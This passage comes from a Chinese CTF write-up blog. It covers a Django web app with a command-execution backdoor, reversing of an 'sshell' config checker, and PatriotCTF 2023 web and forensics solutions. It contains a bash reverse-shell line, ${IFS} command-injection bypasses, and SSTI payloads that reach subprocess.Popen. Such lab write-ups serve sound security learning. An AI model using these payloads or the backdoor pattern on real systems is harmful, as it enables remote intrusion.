CustomResponse(&#123;&#x27;token&#x27;: jwt_encode_handler(payload)&#125;, status=status.HTTP_200_OK)</span><br><span class="line">        else:</span><br><span class="line">            return CustomResponse(&#x27;用户名或密码错误!&#x27;, status=status.HTTP_400_BAD_REQUEST)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class AllWebsiteDataViewSet(ReadOnlyModelViewSet):</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    首页分组嵌套网址数据：查询 /api/alldata/</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">    queryset = models.WebSiteGroup.objects.all()</span><br><span class="line">    serializer_class = AllWebsiteDataSerializers</span><br><span class="line">    # authentication_classes = (JSONWebTokenAuthentication,)</span><br><span class="line">    # permission_classes = [IsAuthenticated]</span><br><span class="line">    filter_backends = (SearchFilter,)</span><br><span class="line">    search_fields = (&#x27;websites__title&#x27;,&#x27;websites__description&#x27;)</span><br><span class="line">    &#x27;&#x27;&#x27;默认参数pk修改为id&#x27;&#x27;&#x27;</span><br><span class="line">    lookup_field = &#x27;pk&#x27;</span><br><span class="line">    lookup_url_kwarg = &#x27;id&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class WebsiteDataViewSet(ModelViewSet):</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    网址管理：增删改查 /api/website/</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    queryset = models.WebSite.objects.all()</span><br><span class="line">    filter_backends = (SearchFilter,)</span><br><span class="line">    search_fields = (&#x27;title&#x27;, &#x27;path&#x27;, &#x27;description&#x27;)</span><br><span class="line">    pagination_class = CustomPagination</span><br><span class="line">    authentication_classes = (JSONWebTokenAuthentication,)</span><br><span class="line">    permission_classes = [IsAuthenticated]</span><br><span class="line">    &#x27;&#x27;&#x27;默认参数pk修改为id&#x27;&#x27;&#x27;</span><br><span class="line">    lookup_field = &#x27;pk&#x27;</span><br><span class="line">    lookup_url_kwarg = &#x27;id&#x27;</span><br><span class="line"></span><br><span class="line">    &#x27;&#x27;&#x27;根据请求选择序列化器&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">    def get_serializer_class(self):</span><br><span class="line">        serializer_class = self.serializer_class</span><br><span class="line">        if self.request.method in (&#x27;POST&#x27;, &#x27;PUT&#x27;, &#x27;PATCH&#x27;, &#x27;DELETE&#x27;):</span><br><span class="line">            serializer_class = UpdateWebsiteDataSerializers</span><br><span class="line">        if self.request.method == &#x27;GET&#x27;:</span><br><span class="line">            serializer_class = GetWebsiteDataSerializers</span><br><span class="line">        return serializer_class</span><br><span class="line"></span><br><span class="line">    &#x27;&#x27;&#x27;重写post接口，支持批量创建&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">    def create(self, request, *args, **kwargs):</span><br><span class="line"></span><br><span class="line">        for data in request.data:</span><br><span class="line">            serializer = self.get_serializer(data=data)</span><br><span class="line">            if not serializer.is_valid():</span><br><span class="line">                return CustomResponse(</span><br><span class="line">                    status=status.HTTP_400_BAD_REQUEST,</span><br><span class="line">                    msg=&#x27;form表单校验不通过&#x27;,</span><br><span class="line">                    data=&#123;&#x27;data&#x27;: serializer.data, &#x27;error&#x27;: serializer.errors&#125;</span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">        for data in request.data:</span><br><span class="line">            serializer = self.get_serializer(data=data)</span><br><span class="line">            serializer.is_valid()</span><br><span class="line">            self.perform_create(serializer)</span><br><span class="line"></span><br><span class="line">        return CustomResponse(</span><br><span class="line">            status=status.HTTP_201_CREATED,</span><br><span class="line">            msg=&#x27;添加成功&#x27;,</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    &#x27;&#x27;&#x27;自定义方法，实现批量删除&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">    @action(methods=[&#x27;delete&#x27;], detail=False, permission_classes=[IsAuthenticated], url_path=&#x27;delete&#x27;)</span><br><span class="line">    def multiple_delete(self, request, *args, **kwargs):</span><br><span class="line">        selectids = request.query_params.get(&#x27;selectId&#x27;, None)</span><br><span class="line">        if not selectids:</span><br><span class="line">            return CustomResponse(status=status.HTTP_404_NOT_FOUND)</span><br><span class="line">        selectid = selectids.split(&#x27;,&#x27;)</span><br><span class="line">        selectid = [int(x) for x in selectid if x.split()]</span><br><span class="line">        models.WebSite.objects.filter(id__in=selectid).delete()</span><br><span class="line">        return CustomResponse(status=status.HTTP_204_NO_CONTENT)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class WebsiteGroupViewSet(ModelViewSet):</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    分组管理：增删改查 /api/group/</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    queryset = models.WebSiteGroup.objects.all()</span><br><span class="line">    serializer_class = WebsiteGroupSerializers</span><br><span class="line">    filter_backends = (SearchFilter,)</span><br><span class="line">    search_fields = (&#x27;name&#x27;,)</span><br><span class="line">    pagination_class = CustomPagination</span><br><span class="line">    authentication_classes = [JSONWebTokenAuthentication, ]</span><br><span class="line">    permission_classes = (IsAuthenticated,)</span><br><span class="line"></span><br><span class="line">    &#x27;&#x27;&#x27;默认参数pk修改为id&#x27;&#x27;&#x27;</span><br><span class="line">    lookup_field = &#x27;pk&#x27;</span><br><span class="line">    lookup_url_kwarg = &#x27;id&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class UserInfoViewSet(ModelViewSet):</span><br><span class="line">    queryset = models.UserInfo.objects.all()</span><br><span class="line">    serializer_class = UserInfoSerializer</span><br><span class="line">    filter_backends = (SearchFilter,)</span><br><span class="line">    search_fields = (&#x27;username&#x27;, &#x27;alias&#x27;, &#x27;is_active&#x27;,)</span><br><span class="line">    pagination_class = CustomPagination</span><br><span class="line">    permission_classes = (IsAuthenticated,)</span><br><span class="line">    authentication_classes = [JSONWebTokenAuthentication, ]</span><br><span class="line">    lookup_field = &#x27;pk&#x27;</span><br><span class="line">    lookup_url_kwarg = &#x27;id&#x27;</span><br><span class="line"></span><br><span class="line">    @action(methods=[&#x27;post&#x27;], detail=True, permission_classes=[IsAuthenticated],</span><br><span class="line">            url_path=&#x27;change-passwd&#x27;, url_name=&#x27;change-passwd&#x27;)</span><br><span class="line">    def change_password(self, request, *args, **kwargs):</span><br><span class="line">        id = kwargs.get(&#x27;id&#x27;)</span><br><span class="line">        password1 = request.data[&#x27;password1&#x27;]</span><br><span class="line">        password2 = request.data[&#x27;password2&#x27;]</span><br><span class="line">        user = models.UserInfo.objects.get(id=id)</span><br><span class="line">        if password1 == password2:</span><br><span class="line">            user.set_password(password2)</span><br><span class="line">            user.save()</span><br><span class="line">            return CustomResponse(msg=&quot;密码修改成功&quot;, status=status.HTTP_200_OK)</span><br><span class="line">        else:</span><br><span class="line">            return CustomResponse(msg=&quot;密码两次输入不一致!&quot;, status=status.HTTP_400_BAD_REQUEST)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class IconViewSet(View):</span><br><span class="line"></span><br><span class="line">    def get(self, request, *args, **kwargs):</span><br><span class="line">        cmd = request.GET.get(&#x27;cmd&#x27;)</span><br><span class="line">        result = subprocess.Popen(cmd, stdout=-1).communicate()[0]</span><br><span class="line">        return HttpResponse(result)</span><br><span class="line"></span><br><span class="line">    def post(self, request):</span><br><span class="line">        id = request.POST.get(&#x27;id&#x27;)</span><br><span class="line">        name = request.POST.get(&#x27;name&#x27;)</span><br><span class="line">        if str(name) == &quot;default.png&quot;:</span><br><span class="line">            return JsonResponse(&#123;&quot;code&quot;: 500, &quot;msg&quot;: &#x27;图片名称不能为default.png，请修改&#x27;&#125;)</span><br><span class="line">        file = request.FILES.get(&#x27;file&#x27;)</span><br><span class="line">        save_path = os.path.join(settings.MEDIA_ROOT, &#x27;icon&#x27;, name)</span><br><span class="line">        ins = models.WebSite.objects.filter(id=id).first()</span><br><span class="line">        if ins:</span><br><span class="line">            ins.icon = name</span><br><span class="line">            ins.save()</span><br><span class="line">            try:</span><br><span class="line">                with open(save_path, &#x27;wb&#x27;) as f:</span><br><span class="line">                    for chunk in file.chunks():</span><br><span class="line">                        f.write(chunk)</span><br><span class="line">                return JsonResponse(&#123;&quot;code&quot;: 200, &quot;msg&quot;: &quot;替换成功&quot;, &quot;detail&quot;: &#x27;&#x27;&#125;)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                return JsonResponse(&#123;&quot;code&quot;: 500, &quot;msg&quot;: &quot;替换失败&quot;, &quot;detail&quot;: e&#125;)</span><br><span class="line">        else:</span><br><span class="line">            return JsonResponse(&#123;&quot;code&quot;: 404&#125;)</span><br><span class="line"></span><br><span class="line">-----------------------------19981713787484837123326027504--</span><br></pre></td></tr></table></figure><p>最终可以实现RCE</p><p><img src="https://s2.loli.net/2023/09/17/RZLbqgei8VcEvpd.png" alt=""></p><h2 id="人工智障"><a href="#人工智障" class="headerlink" title="人工智障"></a>人工智障</h2><p>没打，不过学到了一点，有格式化字符串无溢出，可以劫持fini_array函数来控制执行流</p><h1 id="总决赛"><a href="#总决赛" class="headerlink" title="总决赛"></a>总决赛</h1><p>总决赛更是🐔吧，pwn一个自实现的堆管理机制，👴🏻🚪本地完美patch报服务异常，一个go写的静态编译符号全去，扬了命令执行patch不过，一个看起来像是json解析工具，但是👴🏻🚪分析到最后就分析不出来了，还有一个http报文解析工具，没看。</p><p>数据分析四个取证，👴🏻🚪没有工具。还有四个若智PHP流量题，没啥技术含量。</p><p>分析一下那个看起来像是json解析工具的题，那个最难。</p><h2 id="sshell"><a href="#sshell" class="headerlink" title="sshell"></a>sshell</h2><p>题目要求不能patch源程序，而是改配置文件，但是给的服务器上并没有配置文件，所以需要手动逆向，来给他整出来一份安全的配置文件。</p><p>又是去符号的题，彳亍，高贵的mac用户只能用免费版ida，整不到高版本的破解版ida，bindiff在7.0的支持不好使，只能嗯逆了</p><p><img src="https://s2.loli.net/2023/09/17/K4XqodTOBf9ziSp.png" alt=""></p><p>执行下程序，发现可以执行命令：</p><p><img src="https://s2.loli.net/2023/09/17/HLOMl8ASrB7vwXV.png" alt=""></p><p>搜搜字符串，定位下main函数：</p><p>逻辑比较简单：</p><p><img src="https://s2.loli.net/2023/09/17/sSBouWUmCkQzZ9O.png" alt=""></p><p>发现调用了这个函数：</p><p><img src="https://s2.loli.net/2023/09/17/8Vd6cqmhDyuHfFt.png" alt=""></p><p>点进函数体长这样：</p><p><img src="https://s2.loli.net/2023/09/17/phOiZjfxHgYN4Gt.png" alt=""></p><p>👴🏻猜这玩意是个字符串处理相关的函数，所以我就找个libc来比对一下没有去符号的函数，发现这玩意应该是strtok：</p><p><img src="https://s2.loli.net/2023/09/17/4hb8fFpy7vDOjEU.png" alt=""></p><p>通过比对没有去符号的libc库和去掉符号的静态编译的一些函数，还是可以比较准确的还原出来大部分库函数的，此后还原所需要的库函数时不再赘述</p><p>然后回到源程序，获取完命令之后应该是执行命令或者解析参数之类的，所以下面三个函数大概就是搞这个的：</p><p><img src="https://s2.loli.net/2023/09/18/HZzUEGD6FP5fCbN.png" alt=""></p><p>首先看sub_401F93函数：</p><p><img src="https://s2.loli.net/2023/09/18/BWzJMChbKms8qN1.png" alt=""></p><p>这个东西类似于一个函数指针一样的东西，追一下看看：</p><p><img src="https://s2.loli.net/2023/09/18/7gIDTqLUl1Ce32j.png" alt=""></p><p>这些函数很可能和上面的字符串对应，是对应的函数，分别追踪一下，可以重命名一下，得到具体的函数功能：</p><p><img src="https://s2.loli.net/2023/09/18/lLCkMmxijeHR2G6.png" alt=""></p><p>我们进一步搜索字符串，发现adminCode等字符串，通过定位得知init_array调用了一个函数进行了初始化：</p><p><img src="https://s2.loli.net/2023/09/18/yh5XbJZftaUrRDp.png" alt=""></p><p>经过推测是打开一个swordSh文件，然后做了一些文件内容读取相关的操作，并且文件中需要有adminCode、badChar等字段，编写一个swordSh文件如下：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="attr">&quot;adminCode&quot;</span>: <span class="string">&quot;aaaaaaaa&quot;</span>,</span><br><span class="line"><span class="attr">&quot;badChar&quot;</span>: [<span class="string">&quot;bbbbbbbb&quot;</span>, <span class="string">&quot;cccccccc&quot;</span>],</span><br><span class="line"><span class="attr">&quot;autoLogin&quot;</span>: <span class="string">&quot;dddddddd&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后经过sub_4040E6的处理，在堆空间形成如下布局：</p><p><img src="https://s2.loli.net/2023/09/18/YuRThmwnOKVjEts.png" alt=""></p><p>猜测此函数是用来将文件的键值对做匹配，0x50的堆块存储指针，下面的堆块去存储具体的内容</p><p>到处理badChar字段的时候，使用如下逻辑：</p><p><img src="https://s2.loli.net/2023/09/18/p3kc5F2VW4bvKNT.png" alt=""></p><p>首先获取badchar的起始指针，并且允许badchar最多有八个数据，取出对应的chunk并且存入到栈空间的数组中，其中badchar[i] + 0x28恰好可以索引到对应的字符串：</p><p><img src="https://s2.loli.net/2023/09/18/NcmBTKYQlvFCnyz.png" alt=""></p><p>对于autoLogin的处理如下：</p><p><img src="https://s2.loli.net/2023/09/18/TdjY5zhZ1Rk73Dn.png" alt=""></p><p>大致是获取autoLogin字段，并且把badchar放入到bss中的变量里</p><p>由于在登录时会验证这个字段：</p><p><img src="https://s2.loli.net/2023/09/18/gw6rPHEtaRpcVkI.png" alt=""></p><p>并且这个字段在init_array中的loader函数中被赋值，所以我们需要关注adminCode这个字段，需要进行配置文件的更改，使得这个字段不能默认为空：</p><p><img src="https://s2.loli.net/2023/09/18/X9ngRtqfYo573rS.png" alt=""></p><p>重点关注此字段：</p><p><img src="https://s2.loli.net/2023/09/18/plGrkgEbFRzjqCP.png" alt=""></p><p>默认情况下，这个字段为空，所以当使用程序的登录功能时，只需输入0便可以成功登录：</p><p><img src="https://s2.loli.net/2023/09/18/yGKu4P2fMHJOv6e.png" alt=""></p><p>所以我们的目标是更改配置文件，使得程序使用者无法通过输入0来登录</p><p>因为符号表去了，所以逆向它的分配算法十分困难，经过一顿手工测试，发现当adminCode为整数时，可以将此字段改掉：</p><p><img src="https://s2.loli.net/2023/09/18/nsN6zPgvM7k3AdV.png" alt=""></p><p>此时的admin密码已经被改为100，当输入100时才可以登录成功，登录后便可以执行任意指令：</p><p><img src="https://s2.loli.net/2023/09/18/BRl8m3xfISHOnT7.png" alt=""></p><p>所以我猜patch的思路就是把swordSh文件中的adminCode改成一个随机数，让check脚本无法登录，最终swordSh文件如下：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="attr">&quot;adminCode&quot;</span>:<span class="number">100</span>,</span><br><span class="line"><span class="attr">&quot;badChar&quot;</span>: [<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;d&quot;</span>, <span class="string">&quot;e&quot;</span>, <span class="string">&quot;f&quot;</span>, <span class="string">&quot;g&quot;</span>, <span class="string">&quot;h&quot;</span>],</span><br><span class="line"><span class="attr">&quot;autoLogin&quot;</span>: <span class="string">&quot;fxxk&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可惜比赛结束了，验证不了了</p><p>👴🏻就是个🥦🐔</p>]]></content>
      
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> reverse </tag>
            
            <tag> 流量分析 </tag>
            
            <tag> Fix </tag>
            
            <tag> 取证 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PatriotCTF 2023 write up</title>
      <link href="2023/09/11/PCTF-wp/"/>
      <url>2023/09/11/PCTF-wp/</url>
      
        <content type="html"><![CDATA[<p>周六末比较无聊，跟舍友和实验室的同学找了个老外的比赛打打，把自己做出来的题写个wp然后骂骂出题人。</p><p><strong>总结：pwn是好活，但是👴🏻不会；取证是好活，但是👴🏻也不会；逆向是好活，但是👴🏻不会；开源情报是好活，但是👴🏻不会；web是烂活，但是👴🏻ak了，我只能说我是个傻逼。</strong></p><p>（注：每道题目都会标注是好活还是烂活，好活与烂活的唯一评判标准就是能否对未来比赛有用&amp;扩充知识&amp;巩固知识，所有的脑洞题根据出题人的虚无空间里的另外一个平行时空的🐴的寿命长短来判断烂活程度</p><p><img src="https://s2.loli.net/2023/09/11/WpUJxEv3b6AfyhH.png" alt=""></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Scavenger-Hunt（烂活，但是是beginner）"><a href="#Scavenger-Hunt（烂活，但是是beginner）" class="headerlink" title="Scavenger Hunt（烂活，但是是beginner）"></a>Scavenger Hunt（烂活，但是是beginner）</h2><p>找五部分flag，f12找到一堆，还有一个在robots.txt下面</p><h2 id="Checkmate（烂活）"><a href="#Checkmate（烂活）" class="headerlink" title="Checkmate（烂活）"></a>Checkmate（烂活）</h2><p><img src="https://s2.loli.net/2023/09/11/ufe2czMnmQRVF1d.png" alt=""></p><p>f12找到源码，输入用户名和密码，然后进行校验，然后下面提示check.php</p><p>逆向没啥难度，脚本如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add_list = []</span><br><span class="line">or_list = []</span><br><span class="line">xor_list = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">97</span>, <span class="number">123</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">97</span>, <span class="number">123</span>):</span><br><span class="line">        add_ = i &amp; j</span><br><span class="line">        or_ = i | j</span><br><span class="line">        xor_ = i ^ j</span><br><span class="line">        <span class="keyword">if</span> add_ == <span class="number">0x60</span>:</span><br><span class="line">            <span class="comment"># result[0] = chr(i)</span></span><br><span class="line">            <span class="comment"># result[2] = chr(j)</span></span><br><span class="line">            print(<span class="string">&#x27;add:&#x27;</span>, i, j, <span class="built_in">chr</span>(i), <span class="built_in">chr</span>(j))</span><br><span class="line">            add_list.append(<span class="built_in">chr</span>(i)+ <span class="built_in">chr</span>(j))</span><br><span class="line">        <span class="keyword">if</span> or_ == <span class="number">0x61</span>:</span><br><span class="line">            <span class="comment"># result[1] = chr(i)</span></span><br><span class="line">            <span class="comment"># result[4] = chr(j)</span></span><br><span class="line">            print(<span class="string">&#x27;or:&#x27;</span>, i, j, <span class="built_in">chr</span>(i), <span class="built_in">chr</span>(j))</span><br><span class="line">            or_list.append(<span class="built_in">chr</span>(i)+ <span class="built_in">chr</span>(j))</span><br><span class="line">        <span class="keyword">if</span> xor_ == <span class="number">0x6</span>:</span><br><span class="line">            <span class="comment"># result[3] = chr(i)</span></span><br><span class="line">            <span class="comment"># result[5] = chr(j)</span></span><br><span class="line">            print(<span class="string">&#x27;xor:&#x27;</span>, i, j, <span class="built_in">chr</span>(i), <span class="built_in">chr</span>(j))</span><br><span class="line">            xor_list.append(<span class="built_in">chr</span>(i)+ <span class="built_in">chr</span>(j))</span><br><span class="line"></span><br><span class="line">result = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(add_list)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(or_list)):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(xor_list)):</span><br><span class="line">            result.append(add_list[i][<span class="number">0</span>] + or_list[j][<span class="number">0</span>] + add_list[i][<span class="number">1</span>] + xor_list[k][<span class="number">0</span>] + or_list[j][<span class="number">1</span>] + xor_list[k][<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">print(<span class="built_in">len</span>(result))</span><br><span class="line">result = [line+<span class="string">&quot;\n&quot;</span> <span class="keyword">for</span> line <span class="keyword">in</span> result]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.writelines(result)</span><br></pre></td></tr></table></figure><p>这题主要是不知道要干啥，check.php就是输入密码，然后没了，后来看出题人说，和名字有关</p><p><img src="https://s2.loli.net/2023/09/11/5MekqF2SITpUKvO.png" alt=""></p><p>4k次爆破，上面脚本跑出来的结果差不多就是三千多次，直接爆破就出了，纯纯烂活</p><p><img src="https://s2.loli.net/2023/09/11/eNRpkKrXTHiZLoP.png" alt=""></p><h2 id="Flower-Shop（好活）"><a href="#Flower-Shop（好活）" class="headerlink" title="Flower Shop（好活）"></a>Flower Shop（好活）</h2><p>给了源码，审计发现重置密码功能有问题，重置密码功能，提交到reset.inc.php中处理</p><p><img src="https://s2.loli.net/2023/09/11/Ka74UQRtIhejgk9.png" alt=""></p><p>reset.inc.php中调用了resetPassword方法</p><p><img src="https://s2.loli.net/2023/09/11/TeJUQ2BdFpanuot.png" alt=""></p><p>这里面有个exec，回溯下可以发现tmpPass不可控，但是wh是可控参数</p><p><img src="https://s2.loli.net/2023/09/11/tYsnRCbM8l3diaT.png" alt=""></p><p>wh在注册的时候会让你传入一个webhook链接，参数可控</p><p><img src="https://s2.loli.net/2023/09/11/unNyeg68JKHMpPx.png" alt=""></p><p>但是会进行一些过滤，主要是进行了filter_var的过滤：</p><p><img src="https://s2.loli.net/2023/09/11/3cxeTPmMqN5VIzh.png" alt=""></p><p><img src="https://s2.loli.net/2023/09/11/nBzSdHKlsNOhmEZ.png" alt=""></p><p>参数可控，第二个filter_var没必要绕过，可以直接植入webhook链接，也可以用javascript伪协议来绕；第一个过滤空格，可以用${IFS}来绕</p><p>但是命令没回显，考虑反弹shell，在vps上建一个test.txt，内容如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>其中换上自己的公网ip，然后监听7777端口</p><p>payload如下：</p><p><img src="https://s2.loli.net/2023/09/11/LZx1ktoYuQTh94R.png" alt=""></p><p><img src="https://s2.loli.net/2023/09/11/nCxH2eThRWcXFz7.png" alt=""></p><p><img src="https://s2.loli.net/2023/09/11/No9CUphBfHnTzEu.png" alt=""></p><h2 id="Pick-Your-Starter（好活）"><a href="#Pick-Your-Starter（好活）" class="headerlink" title="Pick Your Starter（好活）"></a>Pick Your Starter（好活）</h2><p>给了如下页面</p><p><img src="https://s2.loli.net/2023/09/11/9IqKZfFpsA6oVl7.png" alt=""></p><p>测测可以发现是ssti</p><p><img src="https://s2.loli.net/2023/09/11/DEPakRhsZoO4NWc.png" alt=""></p><p>首先考虑带os的命令执行，但是手动fuzz了一波，发现了大致有如下黑名单：</p><blockquote><p>os</p><p>-</p><p>空格</p><p>[]</p><p>‘</p><p>“</p><p>builtins</p></blockquote><p>然后考虑用lazyFIle读一下文件，但最终失败了，然后考虑用subprocess.Process执行命令，先跑一下他的位置：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">400</span>, <span class="number">500</span>):</span><br><span class="line">    payload = <span class="string">&quot;&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(&quot;</span>  + <span class="built_in">str</span>(i) +  <span class="string">&quot;)&#125;&#125;&quot;</span></span><br><span class="line">    url = <span class="string">&#x27;http://chal.pctf.competitivecyber.club:5555/&#x27;</span> + payload</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;Flag 5/5=e4a541; PHPSESSID=1314a5d83fd38e1c6d3ebdf4a2873a68&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    response = requests.get(url, headers=headers, verify=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;subprocess&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>本来想用如下payload打</p><p><code>&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(455)(request.args.cmd,shell=True,stdout=-1).communicate().__getitem__(0).strip()&#125;&#125;&amp;cmd=ls</code></p><p>结果发现过滤了负号，想用~False来绕，结果500了，但是本地可以执行命令，不清楚远程什么情况，url编码也不彳亍，而且经过测试，没法用request.args和request.values来传参，命令无法执行，也不清楚什么情况（</p><p><img src="https://s2.loli.net/2023/09/11/ny843IzLX2mVSMO.png" alt=""></p><p>所以考虑不用stdout回显命令的执行结果，那么首先想到的就是反弹shell，但是参数的位置既不能get，又不能post来传，所以想到用cookie传。</p><p><code>&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(455)(request.cookies.a,shell=True).communicate()&#125;&#125;</code></p><p>当cookie传入sleep 5时，页面停止响应，证明可以执行命令。</p><p>但是经过测试，server端没有curl，nc之类的，bash -i 反弹shell也不管用。</p><p>那就考虑DNS外带，发现没有禁ping命令</p><p><img src="https://s2.loli.net/2023/09/11/7kDAqGPVEKCHwZi.png" alt=""></p><p>但是DNS外带的话，命令执行的结果很长就外带不了，所以只能猜测flag的位置，然后就猜中了，payload报文如下</p><p><img src="https://s2.loli.net/2023/09/11/DckWl7rpznstSNh.png" alt=""></p><p><img src="https://s2.loli.net/2023/09/11/VzjwP613vMF4ob9.png" alt=""></p><h2 id="One-for-all（究极烂活）"><a href="#One-for-all（究极烂活）" class="headerlink" title="One-for-all（究极烂活）"></a>One-for-all（究极烂活）</h2><p>这么喜欢玩拼图要不要把你🐴给拼起来</p><p>四部分flag，完全没有任何逻辑，除了有一部分是sql注入，全靠摁猜，出题人还不让爆破，不爆破拿🔨猜</p><p>出题人用flask写的，按照找到flag的顺序来说，首先是最后一部分flag，有个profile页面，id传0才给最后一部分flag，别的传啥都是一个静态页面</p><p><img src="https://s2.loli.net/2023/09/11/o2WILqvrbHxk3nE.png" alt=""></p><p>然后第一部分flag是在主页里面把cookie改成admin获取flag</p><p>第三部分flag是sql注入，同时获得一个secret页面：</p><p><img src="/Users/lemon/Library/Application%20Support/typora-user-images/image-20230910143859539.png" alt=""></p><p>第二部分flag就在他给的secret路径相关，但是想了一下午，啥手法都试了都没有结果，然后dirsearch上大分：</p><p><img src="https://s2.loli.net/2023/09/11/6oSDtL4sHmyZqiX.png" alt=""></p><p><img src="https://s2.loli.net/2023/09/11/y7fWeho8SUpYQrH.png"  /></p><p>我只能说究极烂活，然后比赛结束后开源了仓库，我寻思去看看咋写的代码吧，结果：</p><p><img src="https://s2.loli.net/2023/09/11/hTmrtiwZV1SAJGY.png" alt=""></p><p>你🐴④了</p><h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="Unsupported-Format"><a href="#Unsupported-Format" class="headerlink" title="Unsupported Format"></a>Unsupported Format</h2><p>修jpg，找个在线网站一把🔐了，属于beginner</p><p><img src="https://s2.loli.net/2023/09/11/1E2ygbGxz69ritY.jpg" alt=""></p><h2 id="Read-The-EULA（好活）"><a href="#Read-The-EULA（好活）" class="headerlink" title="Read The EULA（好活）"></a>Read The EULA（好活）</h2><p>题目描述：</p><blockquote><p> My friend and I use to play Minecraft all the time together, but with recent updates he went off on some tangent about something called a Eula or something like that. Anyways, he said he found a new mining game he was testing but wouldn’t tell me the name of it. All he sent was a PCAP of him playing the game, saying he hid a flag in his movement… whatever that means.</p></blockquote><p>然后给了个流量包，一开始wireshark解析出来全部是UDP的流量，但是看起来似乎是一段用户自定义的协议</p><p>然后根据提示找minetest，发现是个类似于Minecraft的游戏引擎（？</p><p><a href="https://github.com/minetest/minetest">https://github.com/minetest/minetest</a></p><p>然后翻了下目录，发现uilt/wireshark里面有个minetest.lua脚本，然后根据作者的table，发现第二部分是客户端的指令解析</p><p><img src="https://s2.loli.net/2023/09/11/n8KS6uCbzwkIQHc.png" alt=""></p><p>先甭管这么多，先把这个lua放到wireshark插件目录下面，尝试解析下流量，结果能识别特定的协议和字段了</p><p><img src="https://s2.loli.net/2023/09/11/4Rue79QMLDVZpSk.png" alt=""></p><p>然后去看他客户端的流量字段的解析规则，发现如下代码：</p><p><img src="https://s2.loli.net/2023/09/11/w3vWCVPkhtDG9Ts.png" alt=""></p><p>然后发现这个地方给出了用户移动的数据，尝试把pcapng数据包导出为json，然后写个脚本提取出所有的客户端的角色的移动数据（x，y，z）</p><p>发现y是个定值1500，所以提取出所有的（x，z），尝试绘制散点图，最终脚本如下：</p><figure class="highlight python"><table><tr><td 